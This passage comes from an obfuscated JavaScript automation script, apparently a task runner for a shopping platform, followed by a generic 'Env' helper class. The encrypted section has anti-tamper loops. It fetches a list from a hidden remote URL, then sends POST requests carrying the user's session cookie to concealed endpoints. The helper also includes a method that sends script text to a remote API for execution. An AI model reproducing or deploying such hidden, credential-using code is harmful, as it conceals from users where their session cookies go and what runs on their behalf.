_0x593ed1['\x74\x65\x73\x74'](_0xa1edbe['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x535c50=function(_0x197251){var _0x448d0c=~-0x1>>0x1+0xff%0x0;if(_0x197251['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x448d0c)){_0x341d0e(_0x197251);}};var _0x341d0e=function(_0x12aad8){var _0x3b5f4c=~-0x4>>0x1+0xff%0x0;if(_0x12aad8['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x3b5f4c){_0x535c50(_0x12aad8);}};if(!_0x47a72a()){if(!_0x1d98d7()){_0x535c50('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x535c50('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x535c50('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0xc733ff();function wuzhi(_0x525fbc){var _0x1bb6c8={'DepDU':function(_0x189fe9){return _0x189fe9();},'siTqF':function(_0x595cfd,_0x2217a2){return _0x595cfd(_0x2217a2);},'YpNBp':function(_0x402a57,_0xabaa2a){return _0x402a57!==_0xabaa2a;},'oDMgK':_0x1398('0','jKhV'),'uupaa':_0x1398('1','a#kq'),'hGtCt':function(_0x3da33a,_0x23ba0b){return _0x3da33a===_0x23ba0b;},'QKDJT':_0x1398('2','Q)CY'),'dYvxl':_0x1398('3','p#BW'),'ZWbDC':_0x1398('4','nnQn'),'mnArh':_0x1398('5','5Q!%'),'juECJ':_0x1398('6','k1AO'),'RGYiQ':_0x1398('7','py@J'),'pwkKZ':_0x1398('8','&)z!'),'usfkD':_0x1398('9','eHpX'),'tvibY':_0x1398('a','0rB2'),'GEPTU':_0x1398('b','suYE'),'SELgQ':_0x1398('c','e29a'),'DukgN':_0x1398('d','Np!X'),'xQkPI':_0x1398('e','8hA3'),'bObny':_0x1398('f','jKhV')};let _0x19e341=_0x525fbc[_0x1398('10','U*!m')];let _0x2af5a1={'url':_0x1398('11','OkQD')+t,'headers':{'Host':_0x1bb6c8[_0x1398('12','[yPs')],'Content-Type':_0x1bb6c8[_0x1398('13','eHpX')],'origin':_0x1bb6c8[_0x1398('14','fIgj')],'Accept-Encoding':_0x1bb6c8[_0x1398('15','BTW#')],'Cookie':cookie,'Connection':_0x1bb6c8[_0x1398('16','Uipy')],'Accept':_0x1bb6c8[_0x1398('17','Nv1A')],'User-Agent':$[_0x1398('18','!8Lb')]()?process[_0x1398('19','py@J')][_0x1398('1a','*rZG')]?process[_0x1398('1b','5MUf')][_0x1398('1c','XwLm')]:_0x1bb6c8[_0x1398('1d','eHpX')](require,_0x1bb6c8[_0x1398('1e','L3)i')])[_0x1398('1f','*rZG')]:$[_0x1398('20','niXL')](_0x1bb6c8[_0x1398('21','vZXv')])?$[_0x1398('22','Q)CY')](_0x1bb6c8[_0x1398('23','eHpX')]):_0x1bb6c8[_0x1398('24','!8Lb')],'referer':_0x1398('25','Uipy'),'Accept-Language':_0x1bb6c8[_0x1398('26','JboW')]},'body':_0x1398('27','5Q!%')+_0x19e341+_0x1398('28','BTW#')+t+_0x1398('29','*rZG')+t};return new Promise(_0x4f4ce0=>{var _0x27ad50={'hxHYT':function(_0x2c89ff){return _0x1bb6c8[_0x1398('2a','p#BW')](_0x2c89ff);},'VMlqF':function(_0x47fb9f,_0x46dc9f){return _0x1bb6c8[_0x1398('2b','gkpd')](_0x47fb9f,_0x46dc9f);},'ccOjG':function(_0x136287,_0x4ccbf8){return _0x1bb6c8[_0x1398('2c','XwLm')](_0x136287,_0x4ccbf8);},'ucaSf':_0x1bb6c8[_0x1398('2d','gkpd')],'qJlHX':_0x1bb6c8[_0x1398('2e','5Q!%')],'pvygO':function(_0x37b6b7,_0xe2f410){return _0x1bb6c8[_0x1398('2f','Q)CY')](_0x37b6b7,_0xe2f410);},'fTZNX':_0x1bb6c8[_0x1398('30','JboW')],'AFrNU':_0x1bb6c8[_0x1398('31','suYE')],'idlHm':_0x1bb6c8[_0x1398('32','e29a')],'VhQPK':_0x1bb6c8[_0x1398('33','Uipy')],'COMfc':function(_0x105014){return _0x1bb6c8[_0x1398('34','8hA3')](_0x105014);}};$[_0x1398('35','Np!X')](_0x2af5a1,(_0x202fd7,_0x1b22a1,_0x28904a)=>{var _0x493357={'uOgfB':function(_0x8a68d3,_0x2aeb0e){return _0x27ad50[_0x1398('36','0rB2')](_0x8a68d3,_0x2aeb0e);}};if(_0x27ad50[_0x1398('37','e29a')](_0x27ad50[_0x1398('38','U*!m')],_0x27ad50[_0x1398('39','qTkG')])){try{if(_0x202fd7){console[_0x1398('3a','jKhV')]($[_0x1398('3b','!8Lb')]+_0x1398('3c','py@J'));}else{if(_0x27ad50[_0x1398('3d','vq7t')](_0x27ad50[_0x1398('3e','5Q!%')],_0x27ad50[_0x1398('3f','kpFy')])){if(_0x27ad50[_0x1398('40','vZXv')](safeGet,_0x28904a)){if(_0x27ad50[_0x1398('41','rEZx')](_0x27ad50[_0x1398('42','qTkG')],_0x27ad50[_0x1398('43','5MUf')])){_0x27ad50[_0x1398('44','3fNx')](_0x4f4ce0);}else{_0x28904a=JSON[_0x1398('45','8hA3')](_0x28904a);}}}else{if(_0x493357[_0x1398('46','eHpX')](safeGet,_0x28904a)){_0x28904a=JSON[_0x1398('47','kD@*')](_0x28904a);}}}}catch(_0x7a4368){if(_0x27ad50[_0x1398('48','CfMF')](_0x27ad50[_0x1398('49','[yPs')],_0x27ad50[_0x1398('4a','1%Rg')])){$[_0x1398('4b','Nv1A')](_0x7a4368);}else{console[_0x1398('4c','3fNx')]($[_0x1398('4d','$ySw')]+_0x1398('4e','Nv1A'));}}finally{_0x27ad50[_0x1398('4f','kD@*')](_0x4f4ce0);}}else{$[_0x1398('50','a#kq')](e);}});});}function shuye72(){var _0x194572={'HuyiW':function(_0x420344,_0x594a44){return _0x420344(_0x594a44);},'uvguz':function(_0x5303ae,_0x546662){return _0x5303ae!==_0x546662;},'mgKbk':_0x1398('51','niXL'),'kQXgp':_0x1398('52','[yPs'),'eCRYN':function(_0x13c9ef,_0x1e9734){return _0x13c9ef<_0x1e9734;},'LqWLX':function(_0x3692ea,_0x1755f5){return _0x3692ea===_0x1755f5;},'nnuTF':_0x1398('53','8hA3'),'lHsLV':_0x1398('54','Np!X'),'RCgxR':_0x1398('55','8hA3'),'vTRZf':function(_0x5d690c){return _0x5d690c();},'XbYLK':_0x1398('56','k1AO'),'spGhi':_0x1398('57','a%ng')};return new Promise(_0xe69150=>{var _0x3ebcdf={'BkTRu':function(_0x1a2bd5,_0x55b25f){return _0x194572[_0x1398('58','$ySw')](_0x1a2bd5,_0x55b25f);},'YRcnV':function(_0x1a28d2,_0x2c61a5){return _0x194572[_0x1398('59','Uipy')](_0x1a28d2,_0x2c61a5);},'YPDaS':_0x194572[_0x1398('5a','eHpX')],'pOLTy':_0x194572[_0x1398('5b','e29a')],'olIoU':function(_0x4f3087,_0x59e11a){return _0x194572[_0x1398('5c','0rB2')](_0x4f3087,_0x59e11a);},'waDjb':function(_0x564306,_0x756bdc){return _0x194572[_0x1398('5d','0rB2')](_0x564306,_0x756bdc);},'DMonw':function(_0xf6e46c,_0x2188b3){return _0x194572[_0x1398('5e','JboW')](_0xf6e46c,_0x2188b3);},'ayRLf':function(_0xc94b90,_0x3b3fd2){return _0x194572[_0x1398('5f','a#kq')](_0xc94b90,_0x3b3fd2);},'iaBXh':_0x194572[_0x1398('60','kD@*')],'FMtCy':_0x194572[_0x1398('61','EgB@')],'XnRLV':function(_0x14feb7,_0x3539a0){return _0x194572[_0x1398('62','nnQn')](_0x14feb7,_0x3539a0);},'XYLQK':_0x194572[_0x1398('63','e29a')],'SnVxv':function(_0x26f1a6){return _0x194572[_0x1398('64','niXL')](_0x26f1a6);}};$[_0x1398('65','qTkG')]({'url':_0x194572[_0x1398('66','kD@*')],'headers':{'User-Agent':_0x194572[_0x1398('67','a%ng')]}},async(_0x4d5d7f,_0x362747,_0x2a1653)=>{try{if(_0x4d5d7f){console[_0x1398('68','5Q!%')]($[_0x1398('69','EgB@')]+_0x1398('6a','k1AO'));}else{if(_0x3ebcdf[_0x1398('6b','qTkG')](_0x3ebcdf[_0x1398('6c','$ySw')],_0x3ebcdf[_0x1398('6d','eHpX')])){if(_0x3ebcdf[_0x1398('6e','0rB2')](safeGet,_0x2a1653)){$[_0x1398('6f','U*!m')]=JSON[_0x1398('70','qTkG')](_0x2a1653);if(_0x3ebcdf[_0x1398('71','vq7t')]($[_0x1398('72','*rZG')][_0x1398('73','P!lT')],0x0)){for(let _0xca99a3=0x0;_0x3ebcdf[_0x1398('74','y)xo')](_0xca99a3,$[_0x1398('75','eHpX')][_0x1398('76','gkpd')][_0x1398('77','Nv1A')]);_0xca99a3++){if(_0x3ebcdf[_0x1398('78','Np!X')](_0x3ebcdf[_0x1398('79','nnQn')],_0x3ebcdf[_0x1398('7a','Uipy')])){$[_0x1398('7b','BTW#')](e);}else{let _0x31eab5=$[_0x1398('75','eHpX')][_0x1398('7c','fIgj')][_0xca99a3];await $[_0x1398('7d','py@J')](0x1f4);await _0x3ebcdf[_0x1398('7e','EgB@')](wuzhi,_0x31eab5);}}}}}else{_0x2a1653=JSON[_0x1398('7f','e29a')](_0x2a1653);}}}catch(_0x461fcf){if(_0x3ebcdf[_0x1398('80','gkpd')](_0x3ebcdf[_0x1398('81','JboW')],_0x3ebcdf[_0x1398('82','jKhV')])){if(_0x4d5d7f){console[_0x1398('83','a%ng')]($[_0x1398('84','rEZx')]+_0x1398('85','kpFy'));}else{if(_0x3ebcdf[_0x1398('86','L3)i')](safeGet,_0x2a1653)){_0x2a1653=JSON[_0x1398('87','Np!X')](_0x2a1653);}}}else{$[_0x1398('88','JboW')](_0x461fcf);}}finally{_0x3ebcdf[_0x1398('89','suYE')](_0xe69150);}});});};_0xodP='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}